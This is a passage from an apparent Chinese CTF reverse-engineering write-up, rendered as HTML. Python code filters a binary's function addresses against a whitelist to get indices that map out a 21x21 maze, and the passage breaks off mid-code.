class="hljs-number">0x140003290</span>,<br>    <span class="hljs-number">0x1400041B0</span>,<br>    <span class="hljs-number">0x140004270</span>,<br>    <span class="hljs-number">0x140001F70</span>,<br>    <span class="hljs-number">0x140003F70</span>,<br>    <span class="hljs-number">0x140003B10</span>,<br>    <span class="hljs-number">0x1400023B0</span>,<br>    <span class="hljs-number">0x1400034D0</span>,<br>    <span class="hljs-number">0x140003610</span>,<br>    <span class="hljs-number">0x1400018D0</span>,<br>    <span class="hljs-number">0x140004490</span>,<br>    <span class="hljs-number">0x140004450</span>,<br>    <span class="hljs-number">0x140003E70</span>,<br>    <span class="hljs-number">0x140003A70</span>,<br>    <span class="hljs-number">0x140001CD0</span>,<br>    <span class="hljs-number">0x140002D30</span>,<br>    <span class="hljs-number">0x1400020B0</span>,<br>    <span class="hljs-number">0x140003570</span>,<br>    <span class="hljs-number">0x140002DB0</span>,<br>    <span class="hljs-number">0x1400045F0</span>,<br>    <span class="hljs-number">0x140002EF0</span>,<br>    <span class="hljs-number">0x140003770</span>,<br>    <span class="hljs-number">0x140001910</span>,<br>    <span class="hljs-number">0x140002DD0</span>,<br>    <span class="hljs-number">0x1400029D0</span>,<br>    <span class="hljs-number">0x140002AD0</span>,<br>    <span class="hljs-number">0x140001F50</span>,<br>    <span class="hljs-number">0x140001A30</span>,<br>    <span class="hljs-number">0x140003D30</span>,<br>    <span class="hljs-number">0x140001DB0</span>,<br>    <span class="hljs-number">0x140003AD0</span>,<br>    <span class="hljs-number">0x140001B30</span>,<br>    <span class="hljs-number">0x1400017D0</span>,<br>    <span class="hljs-number">0x140002450</span>,<br>    <span class="hljs-number">0x140003FD0</span>,<br>    <span class="hljs-number">0x140002390</span>,<br>    <span class="hljs-number">0x140002350</span>,<br>    <span class="hljs-number">0x140001790</span>,<br>    <span class="hljs-number">0x1400013B0</span>,<br>    <span class="hljs-number">0x140003CD0</span>,<br>    <span class="hljs-number">0x140003030</span>,<br>    <span class="hljs-number">0x140002110</span>,<br>    <span class="hljs-number">0x140002770</span>,<br>    <span class="hljs-number">0x1400016D0</span>,<br>    <span class="hljs-number">0x1400019B0</span>,<br>    <span class="hljs-number">0x140003E10</span>,<br>    <span class="hljs-number">0x140001A90</span>,<br>    <span class="hljs-number">0x140003CF0</span>,<br>    <span class="hljs-number">0x1400017B0</span>,<br>    <span class="hljs-number">0x140002BB0</span>,<br>    <span class="hljs-number">0x140001F10</span>,<br>    <span class="hljs-number">0x140001890</span>,<br>    <span class="hljs-number">0x1400045D0</span>,<br>    <span class="hljs-number">0x140003C30</span>,<br>    <span class="hljs-number">0x1400011D0</span>,<br>    <span class="hljs-number">0x140001BD0</span>,<br>    <span class="hljs-number">0x140004510</span>,<br>    <span class="hljs-number">0x140001650</span>,<br>    <span class="hljs-number">0x140002150</span>,<br>    <span class="hljs-number">0x140003B50</span>,<br>    <span class="hljs-number">0x1400040D0</span>,<br>    <span class="hljs-number">0x140002830</span>,<br>    <span class="hljs-number">0x140004650</span>,<br>    <span class="hljs-number">0x1400012B0</span>,<br>    <span class="hljs-number">0x140003AB0</span>,<br>    <span class="hljs-number">0x140002C30</span>,<br>    <span class="hljs-number">0x1400019D0</span>,<br>    <span class="hljs-number">0x140003BB0</span>,<br>    <span class="hljs-number">0x140002B90</span>,<br>    <span class="hljs-number">0x140002370</span>,<br>    <span class="hljs-number">0x140003930</span>,<br>    <span class="hljs-number">0x140003810</span>,<br>    <span class="hljs-number">0x1400042F0</span>,<br>    <span class="hljs-number">0x140002F50</span>,<br>    <span class="hljs-number">0x140003250</span>,<br>    <span class="hljs-number">0x1400015F0</span>,<br>    <span class="hljs-number">0x140002630</span>,<br>    <span class="hljs-number">0x1400024D0</span>,<br>    <span class="hljs-number">0x140001830</span>,<br>    <span class="hljs-number">0x140003BD0</span>,<br>    <span class="hljs-number">0x1400046F0</span>,<br>    <span class="hljs-number">0x140002AF0</span>,<br>    <span class="hljs-number">0x140001C70</span>,<br>    <span class="hljs-number">0x140003710</span>,<br>    <span class="hljs-number">0x140002C70</span>,<br>    <span class="hljs-number">0x1400042D0</span>,<br>    <span class="hljs-number">0x140004010</span>,<br>    <span class="hljs-number">0x1400019F0</span>,<br>    <span class="hljs-number">0x140003050</span>,<br>    <span class="hljs-number">0x140002410</span>,<br>    <span class="hljs-number">0x140001DD0</span>,<br>    <span class="hljs-number">0x1400046B0</span>,<br>    <span class="hljs-number">0x140002230</span>,<br>    <span class="hljs-number">0x140004710</span>,<br>    <span class="hljs-number">0x140003DF0</span>,<br>    <span class="hljs-number">0x140001450</span>,<br>    <span class="hljs-number">0x140004070</span>,<br>    <span class="hljs-number">0x140003730</span>,<br>    <span class="hljs-number">0x140001090</span>,<br>    <span class="hljs-number">0x140003ED0</span>,<br>    <span class="hljs-number">0x140002670</span>,<br>    <span class="hljs-number">0x140003DB0</span>,<br>    <span class="hljs-number">0x1400016F0</span>,<br>    <span class="hljs-number">0x140003350</span>,<br>    <span class="hljs-number">0x1400034B0</span>,<br>    <span class="hljs-number">0x140004570</span>,<br>    <span class="hljs-number">0x140002CF0</span>,<br>    <span class="hljs-number">0x140003870</span>,<br>    <span class="hljs-number">0x140001B10</span>,<br>    <span class="hljs-number">0x1400032B0</span>,<br>    <span class="hljs-number">0x140002F30</span>,<br>    <span class="hljs-number">0x140001310</span>,<br>    <span class="hljs-number">0x140003D10</span>,<br>    <span class="hljs-number">0x140003850</span>,<br>    <span class="hljs-number">0x140003430</span>,<br>    <span class="hljs-number">0x140001430</span>,<br>    <span class="hljs-number">0x140001010</span>,<br>    <span class="hljs-number">0x1400042B0</span>,<br>    <span class="hljs-number">0x140003650</span>,<br>    <span class="hljs-number">0x140002850</span>,<br>    <span class="hljs-number">0x1400022F0</span>,<br>    <span class="hljs-number">0x140002710</span>,<br>    <span class="hljs-number">0x140003F10</span>,<br>    <span class="hljs-number">0x1400014D0</span>,<br>    <span class="hljs-number">0x140004590</span>,<br>    <span class="hljs-number">0x140003E90</span>,<br>    <span class="hljs-number">0x140001810</span>,<br>    <span class="hljs-number">0x140003E50</span>,<br>    <span class="hljs-number">0x140003EB0</span>,<br>    <span class="hljs-number">0x140001AF0</span>,<br>    <span class="hljs-number">0x140002270</span>,<br>    <span class="hljs-number">0x140002430</span>,<br>    <span class="hljs-number">0x140004130</span>,<br>    <span class="hljs-number">0x140003E30</span>,<br>    <span class="hljs-number">0x1400039D0</span>,<br>    <span class="hljs-number">0x140001970</span>,<br>    <span class="hljs-number">0x140001870</span>,<br>    <span class="hljs-number">0x140001290</span>,<br>    <span class="hljs-number">0x140002130</span>,<br>    <span class="hljs-number">0x1400035F0</span>,<br>    <span class="hljs-number">0x140003C90</span>,<br>    <span class="hljs-number">0x140002BD0</span>,<br>    <span class="hljs-number">0x140003550</span>,<br>    <span class="hljs-number">0x1400033D0</span>,<br>    <span class="hljs-number">0x140001FF0</span>,<br>    <span class="hljs-number">0x140002A30</span>,<br>    <span class="hljs-number">0x140002330</span>,<br>    <span class="hljs-number">0x1400010D0</span>,<br>    <span class="hljs-number">0x140001190</span>,<br>    <span class="hljs-number">0x140001530</span>,<br>    <span class="hljs-number">0x1400015D0</span>,<br>    <span class="hljs-number">0x140002810</span>,<br>    <span class="hljs-number">0x140001570</span>,<br>    <span class="hljs-number">0x1400043B0</span>,<br>    <span class="hljs-number">0x140002B30</span>,<br>    <span class="hljs-number">0x140002F10</span>,<br>    <span class="hljs-number">0x140001670</span>,<br>    <span class="hljs-number">0x140001CB0</span>,<br>    <span class="hljs-number">0x140002930</span>,<br>    <span class="hljs-number">0x1400040B0</span>,<br>    <span class="hljs-number">0x1400045B0</span>,<br>    <span class="hljs-number">0x140001730</span>,<br>    <span class="hljs-number">0x140002210</span>,<br>    <span class="hljs-number">0x1400017F0</span>,<br>    <span class="hljs-number">0x1400032F0</span>,<br>    <span class="hljs-number">0x1400046D0</span>,<br>    <span class="hljs-number">0x140001390</span>,<br>    <span class="hljs-number">0x1400039F0</span>,<br>    <span class="hljs-number">0x140002550</span>,<br>    <span class="hljs-number">0x140003590</span>,<br>    <span class="hljs-number">0x1400035D0</span>,<br>    <span class="hljs-number">0x1400026D0</span>,<br>    <span class="hljs-number">0x1400022B0</span>,<br>    <span class="hljs-number">0x140001FD0</span>,<br>    <span class="hljs-number">0x140003CB0</span>,<br>    <span class="hljs-number">0x140003A10</span>,<br>    <span class="hljs-number">0x1400041F0</span>,<br>    <span class="hljs-number">0x1400033B0</span>,<br>    <span class="hljs-number">0x140003A30</span>,<br>    <span class="hljs-number">0x140002910</span>,<br>    <span class="hljs-number">0x1400024B0</span>,<br>    <span class="hljs-number">0x140003A90</span>,<br>    <span class="hljs-number">0x1400021B0</span>,<br>    <span class="hljs-number">0x1400024F0</span>,<br>    <span class="hljs-number">0x1400041D0</span>,<br>    <span class="hljs-number">0x140004330</span>,<br>    <span class="hljs-number">0x1400034F0</span>,<br>    <span class="hljs-number">0x1400038D0</span>,<br>    <span class="hljs-number">0x140001630</span>,<br>    <span class="hljs-number">0x140001590</span>,<br>    <span class="hljs-number">0x140002DF0</span>,<br>    <span class="hljs-number">0x140003530</span>,<br>    <span class="hljs-number">0x140002C90</span>,<br>    <span class="hljs-number">0x140001F30</span>,<br>    <span class="hljs-number">0x140002A10</span>,<br>    <span class="hljs-number">0x1400023F0</span>,<br>    <span class="hljs-number">0x1400044D0</span>,<br>    <span class="hljs-number">0x140002AB0</span>,<br>    <span class="hljs-number">0x140003130</span>,<br>    <span class="hljs-number">0x140003DD0</span>,<br>    <span class="hljs-number">0x140004210</span>,<br>    <span class="hljs-number">0x140001510</span>,<br>    <span class="hljs-number">0x1400011B0</span>,<br>    <span class="hljs-number">0x140002030</span>,<br>    <span class="hljs-number">0x1400030B0</span>,<br>    <span class="hljs-number">0x140003470</span>,<br>    <span class="hljs-number">0x140002ED0</span>,<br>    <span class="hljs-number">0x1400040F0</span>,<br>    <span class="hljs-number">0x140003910</span>,<br>    <span class="hljs-number">0x1400011F0</span>,<br>    <span class="hljs-number">0x140002170</span>,<br>    <span class="hljs-number">0x1400012D0</span>,<br>    <span class="hljs-number">0x140002FF0</span>,<br>    <span class="hljs-number">0x140003C70</span>,<br>    <span class="hljs-number">0x140002090</span>,<br>    <span class="hljs-number">0x140003FF0</span>,<br>    <span class="hljs-number">0x1400018B0</span>,<br>    <span class="hljs-number">0x140002CB0</span>,<br>    <span class="hljs-number">0x140002C50</span>,<br>    <span class="hljs-number">0x140001550</span>,<br>    <span class="hljs-number">0x140003B90</span>,<br>    <span class="hljs-number">0x1400043F0</span>,<br>    <span class="hljs-number">0x140001D10</span>,<br>    <span class="hljs-number">0x140001D90</span>,<br>    <span class="hljs-number">0x140004170</span>,<br>    <span class="hljs-number">0x140003690</span>,<br>    <span class="hljs-number">0x140003510</span>,<br>    <span class="hljs-number">0x140003890</span>,<br>    <span class="hljs-number">0x140002A50</span>,<br>    <span class="hljs-number">0x140003370</span>,<br>    <span class="hljs-number">0x1400012F0</span>,<br>    <span class="hljs-number">0x1400037B0</span>,<br>    <span class="hljs-number">0x1400013F0</span>,<br>    <span class="hljs-number">0x140001C90</span>,<br>    <span class="hljs-number">0x1400028F0</span>,<br>    <span class="hljs-number">0x140002D10</span>,<br>    <span class="hljs-number">0x140004390</span>,<br>    <span class="hljs-number">0x140001DF0</span>,<br>    <span class="hljs-number">0x140001150</span>,<br>    <span class="hljs-number">0x140003AF0</span>,<br>    <span class="hljs-number">0x140002490</span>,<br>    <span class="hljs-number">0x1400043D0</span>,<br>    <span class="hljs-number">0x140003090</span>,<br>    <span class="hljs-number">0x140001470</span>,<br>    <span class="hljs-number">0x140003110</span>,<br>    <span class="hljs-number">0x1400014F0</span>,<br>    <span class="hljs-number">0x140001410</span>,<br>    <span class="hljs-number">0x140003EF0</span>,<br>    <span class="hljs-number">0x140004290</span>,<br>    <span class="hljs-number">0x140002050</span>,<br>    <span class="hljs-number">0x1400018F0</span>,<br>    <span class="hljs-number">0x140003270</span>,<br>    <span class="hljs-number">0x140002470</span>,<br>    <span class="hljs-number">0x140002610</span>,<br>    <span class="hljs-number">0x140003F90</span>,<br>    <span class="hljs-number">0x1400037F0</span>,<br>    <span class="hljs-number">0x140004310</span>,<br>    <span class="hljs-number">0x140004630</span>,<br>    <span class="hljs-number">0x140001270</span>,<br>    <span class="hljs-number">0x140002C10</span>,<br>    <span class="hljs-number">0x140002A90</span>,<br>    <span class="hljs-number">0x1400038B0</span>,<br>    <span class="hljs-number">0x140001AB0</span>,<br>    <span class="hljs-number">0x140001230</span>,<br>    <span class="hljs-number">0x140002F90</span>,<br>    <span class="hljs-number">0x140001C10</span>,<br>    <span class="hljs-number">0x140002250</span>,<br>    <span class="hljs-number">0x1400030F0</span>,<br>    <span class="hljs-number">0x1400036B0</span>,<br>    <span class="hljs-number">0x140002750</span>,<br>    <span class="hljs-number">0x140003210</span>,<br>    <span class="hljs-number">0x140001690</span>,<br>    <span class="hljs-number">0x140001BF0</span>,<br>    <span class="hljs-number">0x1400036F0</span>,<br>    <span class="hljs-number">0x1400028D0</span>,<br>    <span class="hljs-number">0x140004030</span>,<br>    <span class="hljs-number">0x140002A70</span>,<br>    <span class="hljs-number">0x1400021D0</span>,<br>    <span class="hljs-number">0x1400029F0</span>,<br>    <span class="hljs-number">0x140002870</span>,<br>    <span class="hljs-number">0x140002E10</span>,<br>    <span class="hljs-number">0x140003330</span>,<br>    <span class="hljs-number">0x1400031F0</span>,<br>    <span class="hljs-number">0x140001E50</span>,<br>    <span class="hljs-number">0x140003C10</span>,<br>    <span class="hljs-number">0x140001A50</span>,<br>    <span class="hljs-number">0x140001A70</span>,<br>    <span class="hljs-number">0x1400028B0</span>,<br>    <span class="hljs-number">0x140001B70</span>,<br>    <span class="hljs-number">0x1400025B0</span>,<br>    <span class="hljs-number">0x1400029B0</span>,<br>    <span class="hljs-number">0x140001990</span>,<br>    <span class="hljs-number">0x140003FB0</span>,<br>    <span class="hljs-number">0x140003670</span>,<br>    <span class="hljs-number">0x140001130</span>,<br>    <span class="hljs-number">0x140002010</span>,<br>    <span class="hljs-number">0x1400030D0</span>,<br>    <span class="hljs-number">0x140001F90</span>,<br>    <span class="hljs-number">0x140004690</span>,<br>    <span class="hljs-number">0x140001CF0</span>,<br>    <span class="hljs-number">0x140004190</span>,<br>    <span class="hljs-number">0x140004530</span>,<br>    <span class="hljs-number">0x140001E30</span>,<br>    <span class="hljs-number">0x1400027D0</span>,<br>    <span class="hljs-number">0x1400044F0</span>,<br>    <span class="hljs-number">0x1400025D0</span>,<br>    <span class="hljs-number">0x140001D70</span>,<br>    <span class="hljs-number">0x1400022D0</span>,<br>    <span class="hljs-number">0x140001950</span>,<br>    <span class="hljs-number">0x1400021F0</span>,<br>    <span class="hljs-number">0x140004410</span>,<br>    <span class="hljs-number">0x140003170</span>,<br>    <span class="hljs-number">0x140004670</span>,<br>    <span class="hljs-number">0x140001C50</span>,<br>    <span class="hljs-number">0x140002730</span>,<br>    <span class="hljs-number">0x140002B70</span>,<br>    <span class="hljs-number">0x1400020F0</span>,<br>    <span class="hljs-number">0x140003750</span>,<br>    <span class="hljs-number">0x140002FD0</span>,<br>    <span class="hljs-number">0x140001E90</span>,<br>    <span class="hljs-number">0x140003150</span>,<br>    <span class="hljs-number">0x1400038F0</span>,<br>    <span class="hljs-number">0x140002D70</span>,<br>    <span class="hljs-number">0x140001BB0</span>,<br>    <span class="hljs-number">0x140003410</span>,<br>    <span class="hljs-number">0x140002CD0</span>,<br>    <span class="hljs-number">0x1400026F0</span>,<br>    <span class="hljs-number">0x140002D90</span>,<br>    <span class="hljs-number">0x140001B50</span>,<br>    <span class="hljs-number">0x140002EB0</span>,<br>    <span class="hljs-number">0x1400032D0</span>,<br>    <span class="hljs-number">0x140002790</span>,<br>    <span class="hljs-number">0x140002070</span>,<br>    <span class="hljs-number">0x140002970</span>,<br>    <span class="hljs-number">0x140001850</span>,<br>    <span class="hljs-number">0x140001170</span>,<br>    <span class="hljs-number">0x140002950</span>,<br>    <span class="hljs-number">0x140001610</span>,<br>    <span class="hljs-number">0x140003490</span>,<br>    <span class="hljs-number">0x140004610</span>,<br>    <span class="hljs-number">0x140004470</span>,<br>    <span class="hljs-number">0x140001EB0</span>,<br>    <span class="hljs-number">0x140003830</span>,<br>    <span class="hljs-number">0x1400020D0</span>,<br>    <span class="hljs-number">0x140002BF0</span>,<br>    <span class="hljs-number">0x140002E50</span>,<br>    <span class="hljs-number">0x140003C50</span>,<br>    <span class="hljs-number">0x140004150</span>,<br>    <span class="hljs-number">0x140003F30</span>,<br>    <span class="hljs-number">0x140001350</span>,<br>    <span class="hljs-number">0x140001D30</span>,<br>    <span class="hljs-number">0x1400035B0</span>,<br>    <span class="hljs-number">0x1400027F0</span>,<br>    <span class="hljs-number">0x140003D90</span>,<br>    <span class="hljs-number">0x140004550</span>,<br>    <span class="hljs-number">0x140002FB0</span>,<br>    <span class="hljs-number">0x140003990</span>,<br>    <span class="hljs-number">0x140004050</span>,<br>    <span class="hljs-number">0x140002690</span>,<br>    <span class="hljs-number">0x140001930</span>,<br>    <span class="hljs-number">0x140002650</span>,<br>    <span class="hljs-number">0x140002990</span>,<br>    <span class="hljs-number">0x1400023D0</span>,<br>    <span class="hljs-number">0x1400044B0</span>,<br>    <span class="hljs-number">0x140001E10</span>,<br>    <span class="hljs-number">0x140002E90</span>,<br>    <span class="hljs-number">0x140001FB0</span>,<br>    <span class="hljs-number">0x140001250</span>,<br>    <span class="hljs-number">0x140003D50</span>,<br>    <span class="hljs-number">0x140001110</span>,<br>    <span class="hljs-number">0x140003970</span>,<br>    <span class="hljs-number">0x140001050</span>,<br>    <span class="hljs-number">0x140001A10</span>,<br>    <span class="hljs-number">0x140003450</span>,<br>    <span class="hljs-number">0x140001070</span>,<br>    <span class="hljs-number">0x140002570</span>,<br>    <span class="hljs-number">0x1400026B0</span>,<br>    <span class="hljs-number">0x1400031B0</span>,<br>    <span class="hljs-number">0x1400036D0</span>,<br>    <span class="hljs-number">0x140003190</span>,<br>    <span class="hljs-number">0x140001B90</span>,<br>    <span class="hljs-number">0x140003B30</span>,<br>    <span class="hljs-number">0x140002D50</span>,<br>    <span class="hljs-number">0x140001490</span>,<br>    <span class="hljs-number">0x140001750</span>,<br>    <span class="hljs-number">0x140001330</span>,<br>    <span class="hljs-number">0x140001C30</span>,<br>    <span class="hljs-number">0x140003790</span>,<br>    <span class="hljs-number">0x140002890</span>,<br>    <span class="hljs-number">0x140001AD0</span>,<br>    <span class="hljs-number">0x1400031D0</span>,<br>    <span class="hljs-number">0x1400014B0</span>,<br>    <span class="hljs-number">0x140003BF0</span>,<br>    <span class="hljs-number">0x140002310</span>,<br>    <span class="hljs-number">0x1400027B0</span>,<br>    <span class="hljs-number">0x140002510</span>,<br>    <span class="hljs-number">0x1400010F0</span>,<br>    <span class="hljs-number">0x140004350</span>,<br>    <span class="hljs-number">0x140003F50</span>,<br>    <span class="hljs-number">0x140003390</span>,<br>    <span class="hljs-number">0x140001030</span>,<br>    <span class="hljs-number">0x140003010</span>,<br>    <span class="hljs-number">0x140003630</span>,<br>    <span class="hljs-number">0x140003950</span>,<br>    <span class="hljs-number">0x140003310</span>,<br>    <span class="hljs-number">0x140004110</span><br>]<br><br>available_functions = <span class="hljs-built_in">set</span>(white_list)<br>checked = []<br><br><span class="hljs-keyword">for</span> i, func_addr <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(func_list):<br>    <span class="hljs-keyword">if</span> func_addr <span class="hljs-keyword">in</span> available_functions:<br>        checked.append(i)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;checked = <span class="hljs-subst">&#123;checked&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">checked</span> = [<span class="hljs-number">22</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">26</span>, <span class="hljs-number">28</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">32</span>, <span class="hljs-number">33</span>, <span class="hljs-number">34</span>, <span class="hljs-number">35</span>, <span class="hljs-number">36</span>, <span class="hljs-number">37</span>, <span class="hljs-number">38</span>, <span class="hljs-number">39</span>, <span class="hljs-number">40</span>, <span class="hljs-number">43</span>, <span class="hljs-number">47</span>, <span class="hljs-number">55</span>, <span class="hljs-number">57</span>, <span class="hljs-number">59</span>, <span class="hljs-number">61</span>, <span class="hljs-number">64</span>, <span class="hljs-number">65</span>, <span class="hljs-number">66</span>, <span class="hljs-number">67</span>, <span class="hljs-number">68</span>, <span class="hljs-number">69</span>, <span class="hljs-number">70</span>, <span class="hljs-number">71</span>, <span class="hljs-number">72</span>, <span class="hljs-number">74</span>, <span class="hljs-number">75</span>, <span class="hljs-number">76</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">82</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">97</span>, <span class="hljs-number">99</span>, <span class="hljs-number">106</span>, <span class="hljs-number">107</span>, <span class="hljs-number">108</span>, <span class="hljs-number">110</span>, <span class="hljs-number">112</span>, <span class="hljs-number">114</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">117</span>, <span class="hljs-number">118</span>, <span class="hljs-number">120</span>, <span class="hljs-number">121</span>, <span class="hljs-number">122</span>, <span class="hljs-number">123</span>, <span class="hljs-number">124</span>, <span class="hljs-number">131</span>, <span class="hljs-number">133</span>, <span class="hljs-number">139</span>, <span class="hljs-number">143</span>, <span class="hljs-number">148</span>, <span class="hljs-number">149</span>, <span class="hljs-number">150</span>, <span class="hljs-number">151</span>, <span class="hljs-number">152</span>, <span class="hljs-number">153</span>, <span class="hljs-number">154</span>, <span class="hljs-number">155</span>, <span class="hljs-number">156</span>, <span class="hljs-number">157</span>, <span class="hljs-number">158</span>, <span class="hljs-number">159</span>, <span class="hljs-number">160</span>, <span class="hljs-number">161</span>, <span class="hljs-number">162</span>, <span class="hljs-number">164</span>, <span class="hljs-number">165</span>, <span class="hljs-number">166</span>, <span class="hljs-number">169</span>, <span class="hljs-number">179</span>, <span class="hljs-number">187</span>, <span class="hljs-number">190</span>, <span class="hljs-number">192</span>, <span class="hljs-number">194</span>, <span class="hljs-number">196</span>, <span class="hljs-number">197</span>, <span class="hljs-number">198</span>, <span class="hljs-number">199</span>, <span class="hljs-number">200</span>, <span class="hljs-number">201</span>, <span class="hljs-number">202</span>, <span class="hljs-number">204</span>, <span class="hljs-number">206</span>, <span class="hljs-number">208</span>, <span class="hljs-number">213</span>, <span class="hljs-number">215</span>, <span class="hljs-number">217</span>, <span class="hljs-number">219</span>, <span class="hljs-number">223</span>, <span class="hljs-number">225</span>, <span class="hljs-number">227</span>, <span class="hljs-number">229</span>, <span class="hljs-number">232</span>, <span class="hljs-number">234</span>, <span class="hljs-number">235</span>, <span class="hljs-number">236</span>, <span class="hljs-number">237</span>, <span class="hljs-number">238</span>, <span class="hljs-number">240</span>, <span class="hljs-number">241</span>, <span class="hljs-number">242</span>, <span class="hljs-number">244</span>, <span class="hljs-number">246</span>, <span class="hljs-number">247</span>, <span class="hljs-number">248</span>, <span class="hljs-number">249</span>, <span class="hljs-number">250</span>, <span class="hljs-number">253</span>, <span class="hljs-number">259</span>, <span class="hljs-number">267</span>, <span class="hljs-number">271</span>, <span class="hljs-number">274</span>, <span class="hljs-number">275</span>, <span class="hljs-number">276</span>, <span class="hljs-number">277</span>, <span class="hljs-number">278</span>, <span class="hljs-number">279</span>, <span class="hljs-number">280</span>, <span class="hljs-number">281</span>, <span class="hljs-number">282</span>, <span class="hljs-number">283</span>, <span class="hljs-number">284</span>, <span class="hljs-number">285</span>, <span class="hljs-number">286</span>, <span class="hljs-number">288</span>, <span class="hljs-number">290</span>, <span class="hljs-number">291</span>, <span class="hljs-number">292</span>, <span class="hljs-number">295</span>, <span class="hljs-number">299</span>, <span class="hljs-number">301</span>, <span class="hljs-number">303</span>, <span class="hljs-number">305</span>, <span class="hljs-number">307</span>, <span class="hljs-number">309</span>, <span class="hljs-number">311</span>, <span class="hljs-number">313</span>, <span class="hljs-number">316</span>, <span class="hljs-number">318</span>, <span class="hljs-number">319</span>, <span class="hljs-number">320</span>, <span class="hljs-number">322</span>, <span class="hljs-number">324</span>, <span class="hljs-number">326</span>, <span class="hljs-number">328</span>, <span class="hljs-number">330</span>, <span class="hljs-number">332</span>, <span class="hljs-number">334</span>, <span class="hljs-number">339</span>, <span class="hljs-number">341</span>, <span class="hljs-number">345</span>, <span class="hljs-number">349</span>, <span class="hljs-number">351</span>, <span class="hljs-number">355</span>, <span class="hljs-number">358</span>, <span class="hljs-number">359</span>, <span class="hljs-number">360</span>, <span class="hljs-number">362</span>, <span class="hljs-number">364</span>, <span class="hljs-number">365</span>, <span class="hljs-number">366</span>, <span class="hljs-number">367</span>, <span class="hljs-number">368</span>, <span class="hljs-number">370</span>, <span class="hljs-number">372</span>, <span class="hljs-number">373</span>, <span class="hljs-number">374</span>, <span class="hljs-number">376</span>, <span class="hljs-number">379</span>, <span class="hljs-number">381</span>, <span class="hljs-number">383</span>, <span class="hljs-number">387</span>, <span class="hljs-number">393</span>, <span class="hljs-number">395</span>, <span class="hljs-number">397</span>, <span class="hljs-number">400</span>, <span class="hljs-number">402</span>, <span class="hljs-number">404</span>, <span class="hljs-number">405</span>, <span class="hljs-number">406</span>, <span class="hljs-number">408</span>, <span class="hljs-number">409</span>, <span class="hljs-number">410</span>, <span class="hljs-number">412</span>, <span class="hljs-number">413</span>, <span class="hljs-number">414</span>, <span class="hljs-number">416</span>, <span class="hljs-number">418</span>]<br></code></pre></td></tr></table></figure><p>索引的最后一个是 418，刚好是迷宫的终点位置</p><p>构造出迷宫</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_maze</span>():<br>    maze = [[<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">21</span>)]<br>    checked = [<span class="hljs-number">22</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">26</span>, <span class="hljs-number">28</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">32</span>, <span class="hljs-number">33</span>, <span class="hljs-number">34</span>, <span class="hljs-number">35</span>, <span class="hljs-number">36</span>, <span class="hljs-number">37</span>, <span class="hljs-number">38</span>, <span class="hljs-number">39</span>, <span class="hljs-number">40</span>, <span class="hljs-number">43</span>, <span class="hljs-number">47</span>, <span class="hljs-number">55</span>, <span class="hljs-number">57</span>, <span class="hljs-number">59</span>, <span class="hljs-number">61</span>, <span class="hljs-number">64</span>, <span class="hljs-number">65</span>, <span class="hljs-number">66</span>, <span class="hljs-number">67</span>, <span class="hljs-number">68</span>, <span class="hljs-number">69</span>, <span class="hljs-number">70</span>, <span class="hljs-number">71</span>, <span class="hljs-number">72</span>, <span class="hljs-number">74</span>, <span class="hljs-number">75</span>, <span class="hljs-number">76</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">82</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">97</span>, <span class="hljs-number">99</span>, <span class="hljs-number">106</span>, <span class="hljs-number">107</span>, <span class="hljs-number">108</span>, <span class="hljs-number">110</span>, <span class="hljs-number">112</span>, <span class="hljs-number">114</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">117</span>, <span class="hljs-number">118</span>, <span class="hljs-number">120</span>, <span class="hljs-number">121</span>, <span class="hljs-number">122</span>, <span class="hljs-number">123</span>, <span class="hljs-number">124</span>, <span class="hljs-number">131</span>, <span class="hljs-number">133</span>, <span class="hljs-number">139</span>, <span class="hljs-number">143</span>, <span class="hljs-number">148</span>, <span class="hljs-number">149</span>, <span class="hljs-number">150</span>, <span class="hljs-number">151</span>, <span class="hljs-number">152</span>, <span class="hljs-number">153</span>, <span class="hljs-number">154</span>, <span class="hljs-number">155</span>, <span class="hljs-number">156</span>, <span class="hljs-number">157</span>, <span class="hljs-number">158</span>, <span class="hljs-number">159</span>, <span class="hljs-number">160</span>, <span class="hljs-number">161</span>, <span class="hljs-number">162</span>, <span class="hljs-number">164</span>, <span class="hljs-number">165</span>, <span class="hljs-number">166</span>, <span class="hljs-number">169</span>, <span class="hljs-number">179</span>, <span class="hljs-number">187</span>, <span class="hljs-number">190</span>, <span class="hljs-number">192</span>, <span class="hljs-number">194</span>, <span class="hljs-number">196</span>, <span class="hljs-number">197</span>, <span class="hljs-number">198</span>, <span class="hljs-number">199</span>, <span class="hljs-number">200</span>, <span class="hljs-number">201</span>, <span class="hljs-number">202</span>, <span class="hljs-number">204</span>, <span class="hljs-number">206</span>, <span class="hljs-number">208</span>, <span 